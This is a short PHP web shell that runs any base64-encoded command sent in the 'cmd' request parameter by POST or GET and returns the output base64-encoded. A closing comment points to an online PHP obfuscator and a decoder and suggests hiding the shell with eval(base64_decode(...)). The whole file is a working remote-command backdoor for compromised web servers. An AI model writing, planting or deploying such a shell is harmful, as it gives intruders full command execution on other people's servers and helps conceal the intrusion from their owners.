<?php
	$result = array();
	$output = "";
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    	exec(base64_decode($_POST['cmd']), $result, $return);
	}
	else
	{
		exec(base64_decode($_GET['cmd']), $result, $return);
	}

	if (count($result) > 1) {
		foreach($result as $line) {
			$output = $output . $line . PHP_EOL;
		}
		$output = base64_encode($output);
		echo $output;
	}
	else
	{
		echo base64_encode($result[0]);
	}


/*
 * Encoded using mobilefish Simple online PHP obfuscator - http://www.mobilefish.com/services/php_obfuscator/php_obfuscator.php
 * Original file = 289 characters
 * All nested functions selected
 * 3 random loops through the nested functions
 * Decoded output @ UnPHP = https://www.unphp.net/decode/cbfb8525fd5f07272c03ce58c9324ffd/
 * 
 * Removed example, but here is a possible for encoding the webshell
 *
 *
 * eval(base64_decode('goeshere'));
 */

?>